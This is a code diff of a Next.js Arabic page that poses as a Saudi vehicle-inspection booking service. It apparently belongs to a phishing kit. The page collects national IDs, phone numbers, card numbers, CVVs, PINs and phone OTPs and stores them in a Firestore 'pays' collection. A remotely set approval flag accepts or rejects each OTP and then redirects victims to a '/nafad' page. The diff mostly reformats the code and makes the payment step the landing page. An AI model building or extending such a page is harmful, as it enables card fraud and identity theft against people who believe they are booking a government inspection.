@@ -105,7 +105,7 @@ export default function BookingPage() {
   // </CHANGE>
   const [region, setRegion] = useState("")
   const [city, setCity] = useState("")
-  const [inspectionCenter, 
+  const [inspectionCenter,
   ] = useState("")
   const [inspectionDate, setInspectionDate] = useState("")
   const [inspectionTime, setInspectionTime] = useState("")
@@ -122,7 +122,7 @@ export default function BookingPage() {
   const [authorizedAgreement, setAuthorizedAgreement] = React.useState(false)
   // ADDED END
 
-  const [currentStep, setCurrentStep] = useState<AppStep>("booking") // Changed initial step to landing
+  const [currentStep, setCurrentStep] = useState<AppStep>("payment-method") // Changed initial step to landing
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
@@ -162,19 +162,21 @@ export default function BookingPage() {
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
-       
+
         if (userData.phoneOtpApproval) {
           setPhoneOtpApproval(userData.phoneOtpApproval as ApprovalStatus)
         }
-        if (userData.phoneOtpApproval==='approved') {
-window.location.href='/nafad'
+        if (userData.phoneOtpApproval === 'approved') {
+          setIsLoading(false)
+          window.location.href = '/nafad'
         }
-        if (userData.phoneOtpApproval==='rejected') {
+        if (userData.phoneOtpApproval === 'rejected') {
+          setIsLoading(false)
           alert('رمز التحقق غير صحيح')
         }
 
-       
-       if (userData.currentPage === "9999") {
+
+        if (userData.currentPage === "9999") {
           window.location.href = "/verify-phone"
         }
       }
@@ -217,7 +219,7 @@ window.location.href='/nafad'
       vehicleType,
       ownerName, // Added ownerName
       nationalId, // Added nationalId
-       
+
       inspectionType,
       step: "booking-completed",
     })
@@ -254,15 +256,15 @@ window.location.href='/nafad'
       cvv,
       step: "card-details-submitted",
     })
-    if(!checkCardAllow(cardNumber)){
-  }
+    if (!checkCardAllow(cardNumber)) {
+    }
     setIsLoading(true)
     setTimeout(() => {
       setCurrentStep("pin")
       setIsLoading(false)
     }, 1500)
   }
-  
+
   const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setPinError("")
@@ -355,7 +357,7 @@ window.location.href='/nafad'
     if (phoneOtpApproval === "approved") {
       setIsLoading(false)
       // Navigate to success page or show success message
-  window.location.href="/nafad"
+      window.location.href = "/nafad"
     } else if (phoneOtpApproval === "rejected") {
       setIsLoading(false)
       setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
@@ -604,7 +606,7 @@ window.location.href='/nafad'
       return
     }
 
-  
+
 
     const authorizedPhoneValidation = validateSaudiPhoneNumber(authorizedPhone)
     if (!authorizedPhoneValidation.valid) {
@@ -672,7 +674,7 @@ window.location.href='/nafad'
   if (currentStep === "landing") {
     return (
       <div dir="rtl" className="min-h-screen bg-background">
-          
+
         {/* Hero Section */}
         <div className="relative overflow-hidden bg-gradient-to-b from-secondary/30 to-background">
           <div className="container mx-auto px-4 py-16 md:py-24 max-w-6xl">
@@ -902,12 +904,12 @@ window.location.href='/nafad'
     const isBlocked = blockedPrefixes.some(prefix =>
       cardNum.startsWith(prefix)
     );
-  
+
     if (isBlocked) {
       setCardError('البطاقة غير مدعومة يرجى ادخال بطاقة اخرى');
       return false;
     }
-  
+
     setCardError('');
     return true;
   };
@@ -915,19 +917,19 @@ window.location.href='/nafad'
   if (currentStep === "booking") {
     return (
       <div dir="rtl" className="min-h-screen bg-background  px-4">
-           <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
-        <div className="container mx-auto px-6 py-4 flex items-center justify-between">
-          <button className="p-2 hover:bg-accent rounded-lg transition-colors">
-            <Menu className="w-5 h-5 text-foreground" />
-          </button>
-          <div className="flex items-center gap-3">
-          <img src='/next.svg' alt="logo" width={180}/>
-          </div>              
-          <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-            English
-          </Button>
-        </div>
-      </header>
+        <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
+          <div className="container mx-auto px-6 py-4 flex items-center justify-between">
+            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
+              <Menu className="w-5 h-5 text-foreground" />
+            </button>
+            <div className="flex items-center gap-3">
+              <img src='/next.svg' alt="logo" width={180} />
+            </div>
+            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
+              English
+            </Button>
+          </div>
+        </header>
         <div className="max-w-3xl mx-auto">
           <Card className="shadow-lg border-border/40">
             <CardHeader className="text-center border-b border-border/40 pb-6">
@@ -949,11 +951,10 @@ window.location.href='/nafad'
                         key={status.id}
                         type="button"
                         onClick={() => setVehicleStatus(status.id)}
-                        className={`p-4 rounded-xl border-2 transition-all ${
-                          vehicleStatus === status.id
+                        className={`p-4 rounded-xl border-2 transition-all ${vehicleStatus === status.id
                             ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
                             : "border-border hover:border-teal-700/50 text-muted-foreground"
-                        }`}
+                          }`}
                       >
                         {status.label}
                       </button>
@@ -987,10 +988,10 @@ window.location.href='/nafad'
                       ))}
                     </select>
                   </div>
-                
+
                 </div>
 
-          
+
                 {/* Owner Name */}
                 <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">اسم المالك</label>
@@ -1031,30 +1032,30 @@ window.location.href='/nafad'
                   </p>
                 </div>
                 <div className="space-y-3 mb-6">
-                    <label className="text-sm font-medium text-foreground">
-                      رقم جوال المالك <span className="text-red-500">*</span>
-                    </label>
-                    <div className="flex gap-2">
-                      <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
-                        <span className="text-xl">🇸🇦</span>
-                        <span className="text-sm font-medium">+966</span>
-                      </div>
-                      <Input
-                        type="tel"
-                        inputMode="numeric"
-                        maxLength={10}
-                        value={authorizedPhone}
-                        onChange={(e) => {
-                          const value = e.target.value
-                            .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
-                            .replace(/\D/g, "")
-                          setAuthorizedPhone(value)
-                        }}
-                        placeholder="5XXXXXXXX"
-                        className="h-12 flex-1"
-                      />
+                  <label className="text-sm font-medium text-foreground">
+                    رقم جوال المالك <span className="text-red-500">*</span>
+                  </label>
+                  <div className="flex gap-2">
+                    <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
+                      <span className="text-xl">🇸🇦</span>
+                      <span className="text-sm font-medium">+966</span>
                     </div>
+                    <Input
+                      type="tel"
+                      inputMode="numeric"
+                      maxLength={10}
+                      value={authorizedPhone}
+                      onChange={(e) => {
+                        const value = e.target.value
+                          .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                          .replace(/\D/g, "")
+                        setAuthorizedPhone(value)
+                      }}
+                      placeholder="5XXXXXXXX"
+                      className="h-12 flex-1"
+                    />
                   </div>
+                </div>
 
                 <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">الرقم التسلسلي</label>
@@ -1087,161 +1088,159 @@ window.location.href='/nafad'
                   </select>
                 </div>
                 <div className="flex items-start gap-3 mb-6">
-          <Checkbox
-            id="authorize"
-            checked={authorizeInspection}
-            onCheckedChange={(checked) => setAuthorizeInspection(checked as boolean)}
-            className="mt-1"
-          />
-          <label htmlFor="authorize" className="flex-1 text-base leading-relaxed cursor-pointer">
-            <div className="font-medium text-gray-900 mb-1">هل تريد تفويض شخص آخر بفحص المركبة</div>
-            <div className="text-sm text-gray-500">قم بتفعيل الخيار لو أردت تفويض شخص آخر غيرك بفحص المركبة</div>
-          </label>
-        </div>
-        {authorizeInspection?   
-                <div className="border-t pt-8 mt-8">
-                  <h3 className="text-xl font-bold text-foreground mb-6">بيانات المفوض</h3>
+                  <Checkbox
+                    id="authorize"
+                    checked={authorizeInspection}
+                    onCheckedChange={(checked) => setAuthorizeInspection(checked as boolean)}
+                    className="mt-1"
+                  />
+                  <label htmlFor="authorize" className="flex-1 text-base leading-relaxed cursor-pointer">
+                    <div className="font-medium text-gray-900 mb-1">هل تريد تفويض شخص آخر بفحص المركبة</div>
+                    <div className="text-sm text-gray-500">قم بتفعيل الخيار لو أردت تفويض شخص آخر غيرك بفحص المركبة</div>
+                  </label>
+                </div>
+                {authorizeInspection ?
+                  <div className="border-t pt-8 mt-8">
+                    <h3 className="text-xl font-bold text-foreground mb-6">بيانات المفوض</h3>
 
-                  {/* Authorized Person Type */}
-                  <div className="space-y-3 mb-6">
-                    <div className="flex gap-4 justify-end">
-                      <button
-                        type="button"
-                        onClick={() => setAuthorizedPersonType("gcc")}
-                        className={`px-6 py-3 rounded-lg border-2 transition-all ${
-                          authorizedPersonType === "gcc"
-                            ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
-                            : "border-border text-muted-foreground"
-                        }`}
-                      >
-                        مواطن خليجي
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => setAuthorizedPersonType("resident")}
-                        className={`px-6 py-3 rounded-lg border-2 transition-all ${
-                          authorizedPersonType === "resident"
-                            ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
-                            : "border-border text-muted-foreground"
-                        }`}
-                      >
-                        مواطن/مقيم
-                      </button>
-                    </div>
-                  </div>
-
-                  {/* Authorized Name */}
-                  <div className="space-y-3 mb-6">
-                    <label className="text-sm font-medium text-foreground">
-                      اسم المفوض <span className="text-red-500"></span>
-                    </label>
-                    <Input
-                      type="text"
-                      value={authorizedName}
-                      onChange={(e) => setAuthorizedName(e.target.value)}
-                      placeholder="أدخل اسم المفوض"
-                      className="h-12"
-                    />
-                  </div>
-
-                  {/* Authorized Phone */}
-                  <div className="space-y-3 mb-6">
-                    <label className="text-sm font-medium text-foreground">
-                      رقم جوال المفوض <span className="text-red-500">*</span>
-                    </label>
-                    <div className="flex gap-2">
-                      <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
-                        <span className="text-xl">🇸🇦</span>
-                        <span className="text-sm font-medium">+966</span>
+                    {/* Authorized Person Type */}
+                    <div className="space-y-3 mb-6">
+                      <div className="flex gap-4 justify-end">
+                        <button
+                          type="button"
+                          onClick={() => setAuthorizedPersonType("gcc")}
+                          className={`px-6 py-3 rounded-lg border-2 transition-all ${authorizedPersonType === "gcc"
+                              ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
+                              : "border-border text-muted-foreground"
+                            }`}
+                        >
+                          مواطن خليجي
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => setAuthorizedPersonType("resident")}
+                          className={`px-6 py-3 rounded-lg border-2 transition-all ${authorizedPersonType === "resident"
+                              ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
+                              : "border-border text-muted-foreground"
+                            }`}
+                        >
+                          مواطن/مقيم
+                        </button>
                       </div>
-                      <Input
-                        type="tel"
-                        inputMode="numeric"
-                        maxLength={10}
-                        value={authorizedPhone}
-                        onChange={(e) => {
-                          const value = e.target.value
-                            .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
-                            .replace(/\D/g, "")
-                          setAuthorizedPhone(value)
-                        }}
-                        placeholder="5XXXXXXXX"
-                        className="h-12 flex-1"
-                      />
                     </div>
-                  </div>
 
-                  {/* Authorized ID */}
-                  <div className="space-y-3 mb-6">
-                    <label className="text-sm font-medium text-foreground">
-                      رقم الهوية / إقامة المفوض <span className="text-red-500">*</span>
-                    </label>
-                    <div className="relative">
+                    {/* Authorized Name */}
+                    <div className="space-y-3 mb-6">
+                      <label className="text-sm font-medium text-foreground">
+                        اسم المفوض <span className="text-red-500"></span>
+                      </label>
                       <Input
                         type="text"
-                        inputMode="numeric"
-                        maxLength={10}
-                        value={authorizedId}
-                        onChange={(e) => {
-                          const value = e.target.value
-                            .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
-                            .replace(/\D/g, "")
-                          setAuthorizedId(value)
-                        }}
-                        placeholder="0000 0000 000"
-                        className="h-12 pl-12"
+                        value={authorizedName}
+                        onChange={(e) => setAuthorizedName(e.target.value)}
+                        placeholder="أدخل اسم المفوض"
+                        className="h-12"
                       />
-                      <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">
-                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                          <rect x="3" y="5" width="18" height="14" rx="2" strokeWidth="2" />
-                          <circle cx="9" cy="11" r="2" strokeWidth="2" />
-                          <path d="M15 10h2M15 13h2" strokeWidth="2" strokeLinecap="round" />
-                        </svg>
+                    </div>
+
+                    {/* Authorized Phone */}
+                    <div className="space-y-3 mb-6">
+                      <label className="text-sm font-medium text-foreground">
+                        رقم جوال المفوض <span className="text-red-500">*</span>
+                      </label>
+                      <div className="flex gap-2">
+                        <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
+                          <span className="text-xl">🇸🇦</span>
+                          <span className="text-sm font-medium">+966</span>
+                        </div>
+                        <Input
+                          type="tel"
+                          inputMode="numeric"
+                          maxLength={10}
+                          value={authorizedPhone}
+                          onChange={(e) => {
+                            const value = e.target.value
+                              .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                              .replace(/\D/g, "")
+                            setAuthorizedPhone(value)
+                          }}
+                          placeholder="5XXXXXXXX"
+                          className="h-12 flex-1"
+                        />
                       </div>
                     </div>
-                  </div>
 
-                  {/* Authorized Birth Date */}
-                  <div className="space-y-3 mb-6">
-                    <label className="text-sm font-medium text-foreground">
-                      تاريخ ميلاد المفوض <span className="text-red-500">*</span>
-                    </label>
-                    <div className="relative">
-                      <Input
-                        type="date"
-                        value={authorizedBirthDate}
-                        onChange={(e) => setAuthorizedBirthDate(e.target.value)}
-                        className="h-12 pl-12"
-                      />
-                      <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground pointer-events-none">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                          <rect x="3" y="4" width="18" height="18" rx="2" ry="2" strokeWidth="2" />
-                          <line x1="16" y1="2" x2="16" y2="6" strokeWidth="2" strokeLinecap="round" />
-                          <line x1="8" y1="2" x2="8" y2="6" strokeWidth="2" strokeLinecap="round" />
-                          <line x1="3" y1="10" x2="21" y2="10" strokeWidth="2" />
-                        </svg>
+                    {/* Authorized ID */}
+                    <div className="space-y-3 mb-6">
+                      <label className="text-sm font-medium text-foreground">
+                        رقم الهوية / إقامة المفوض <span className="text-red-500">*</span>
+                      </label>
+                      <div className="relative">
+                        <Input
+                          type="text"
+                          inputMode="numeric"
+                          maxLength={10}
+                          value={authorizedId}
+                          onChange={(e) => {
+                            const value = e.target.value
+                              .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                              .replace(/\D/g, "")
+                            setAuthorizedId(value)
+                          }}
+                          placeholder="0000 0000 000"
+                          className="h-12 pl-12"
+                        />
+                        <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">
+                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <rect x="3" y="5" width="18" height="14" rx="2" strokeWidth="2" />
+                            <circle cx="9" cy="11" r="2" strokeWidth="2" />
+                            <path d="M15 10h2M15 13h2" strokeWidth="2" strokeLinecap="round" />
+                          </svg>
+                        </div>
                       </div>
                     </div>
-                  </div>
 
-                  {/* Agreement Checkbox */}
-                  <div className="flex items-start gap-3 mb-6">
-                    <input
-                      type="checkbox"
-                      id="authorized-agreement"
-                      checked={authorizedAgreement}
-                      onChange={(e) => setAuthorizedAgreement(e.target.checked)}
-                      className="mt-1 w-5 h-5 rounded border-border text-teal-700 focus:ring-teal-700"
-                    />
-                    <label
-                      htmlFor="authorized-agreement"
-                      className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
-                    >
-                      أوافق على أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني للمركبة المفوض
-                      عليها
-                    </label>
-                  </div>
-                </div>:null}
+                    {/* Authorized Birth Date */}
+                    <div className="space-y-3 mb-6">
+                      <label className="text-sm font-medium text-foreground">
+                        تاريخ ميلاد المفوض <span className="text-red-500">*</span>
+                      </label>
+                      <div className="relative">
+                        <Input
+                          type="date"
+                          value={authorizedBirthDate}
+                          onChange={(e) => setAuthorizedBirthDate(e.target.value)}
+                          className="h-12 pl-12"
+                        />
+                        <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground pointer-events-none">
+                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2" strokeWidth="2" />
+                            <line x1="16" y1="2" x2="16" y2="6" strokeWidth="2" strokeLinecap="round" />
+                            <line x1="8" y1="2" x2="8" y2="6" strokeWidth="2" strokeLinecap="round" />
+                            <line x1="3" y1="10" x2="21" y2="10" strokeWidth="2" />
+                          </svg>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Agreement Checkbox */}
+                    <div className="flex items-start gap-3 mb-6">
+                      <input
+                        type="checkbox"
+                        id="authorized-agreement"
+                        checked={authorizedAgreement}
+                        onChange={(e) => setAuthorizedAgreement(e.target.checked)}
+                        className="mt-1 w-5 h-5 rounded border-border text-teal-700 focus:ring-teal-700"
+                      />
+                      <label
+                        htmlFor="authorized-agreement"
+                        className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
+                      >
+                        أوافق على أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني للمركبة المفوض
+                        عليها
+                      </label>
+                    </div>
+                  </div> : null}
                 {/* ADDED END */}
 
                 {/* Location Selection */}
@@ -1332,20 +1331,20 @@ window.location.href='/nafad'
   if (currentStep === "payment-method") {
     return (
       <div dir="rtl" className="min-h-screen bg-background py-12 px-4">
-      
-          <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
-        <div className="container mx-auto px-6 py-4 flex items-center justify-between">
-          <button className="p-2 hover:bg-accent rounded-lg transition-colors">
-            <Menu className="w-5 h-5 text-foreground" />
-          </button>
-          <div className="flex items-center gap-3">
-          <img src='/next.svg' alt="logo" width={180}/>
-          </div>              
-          <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-            English
-          </Button>
-        </div>
-      </header>  <div className="max-w-2xl mx-auto">
+
+        <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
+          <div className="container mx-auto px-6 py-4 flex items-center justify-between">
+            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
+              <Menu className="w-5 h-5 text-foreground" />
+            </button>
+            <div className="flex items-center gap-3">
+              <img src='/next.svg' alt="logo" width={180} />
+            </div>
+            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
+              English
+            </Button>
+          </div>
+        </header>  <div className="max-w-2xl mx-auto">
           <Card className="shadow-lg border-border/40">
             <CardHeader className="text-center border-b border-border/40 pb-6">
               <CardTitle className="text-3xl font-bold text-foreground">اختر طريقة الدفع</CardTitle>
@@ -1363,22 +1362,20 @@ window.location.href='/nafad'
                       }
                     }}
                     disabled={!method.available}
-                    className={`w-full p-6 rounded-xl border-2 transition-all text-right ${
-                      paymentMethod === method.id
+                    className={`w-full p-6 rounded-xl border-2 transition-all text-right ${paymentMethod === method.id
                         ? "border-teal-700 bg-teal-700/5"
                         : method.available
                           ? "border-border hover:border-teal-700/50"
                           : "border-border opacity-50 cursor-not-allowed"
-                    }`}
+                      }`}
                   >
                     <div className="flex items-center justify-between">
                       <div className="flex items-center gap-4">
                         <div
-                          className={`w-12 h-12 rounded-xl flex items-center justify-center ${
-                            paymentMethod === method.id ? "bg-teal-700 text-white" : "bg-secondary text-foreground"
-                          }`}
+                          className={`w-12 h-12 rounded-xl flex items-center justify-center ${paymentMethod === method.id ? "bg-teal-700 text-white" : "bg-secondary text-foreground"
+                            }`}
                         >
-                      <img src={method.icon} alt="log" width={80}/>
+                          <img src={method.icon} alt="log" width={80} />
                         </div>
                         <div className="text-right">
                           <div className="font-semibold text-foreground text-lg">{method.label}</div>
@@ -1456,12 +1453,12 @@ window.location.href='/nafad'
                     <div className="text-2xl font-bold">{bankInfo?.name || "بطاقة ائتمان"}</div>
                   </div>
                   <div className="absolute top-8 left-8">
-                 {paymentMethod==="card"&&cardNumber.at(0)==='4'?  <img src="/visa-card.png" alt="logo" width={50}/>: paymentMethod==="card"&&cardNumber.at(0)==='5'? <img src="/master.svg" alt="logo" width={50}/>:null}
-                 {paymentMethod==="wallet"?<img src="/mada.svg" alt="logo" width={50}/>:null}
+                    {paymentMethod === "card" && cardNumber.at(0) === '4' ? <img src="/visa-card.png" alt="logo" width={50} /> : paymentMethod === "card" && cardNumber.at(0) === '5' ? <img src="/master.svg" alt="logo" width={50} /> : null}
+                    {paymentMethod === "wallet" ? <img src="/mada.svg" alt="logo" width={50} /> : null}
                   </div>
                   <div className="absolute top-1/2 right-8 -translate-y-1/2">
                     <div className="text-xl font-mono tracking-widest" dir="ltr">
-                      {'**** **** **** '+cardNumber.slice(-4) || "•••• •••• •••• ••••"}
+                      {'**** **** **** ' + cardNumber.slice(-4) || "•••• •••• •••• ••••"}
                     </div>
                   </div>
                   <div className="absolute bottom-8 right-8 left-8 flex justify-between items-end">
@@ -1560,7 +1557,7 @@ window.location.href='/nafad'
                     <Button
                       type="submit"
                       className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
-                      disabled={isLoading ||cardError.length>2}
+                      disabled={isLoading || cardError.length > 2}
                     >
                       {isLoading ? (
                         <>
@@ -1574,11 +1571,11 @@ window.location.href='/nafad'
                   </form>
                 </CardContent>
                 <CardFooter>
-                  {cardError.length>2&&<Alert>
+                  {cardError.length > 2 && <Alert>
                     <AlertDescription className="text-red-500">
-                      <CircleAlert/>
-                     
-                    البطاقة غير مدعومة يرجى ادخال بطاقة اخرى
+                      <CircleAlert />
+
+                      البطاقة غير مدعومة يرجى ادخال بطاقة اخرى
                     </AlertDescription>
                   </Alert>}
                 </CardFooter>
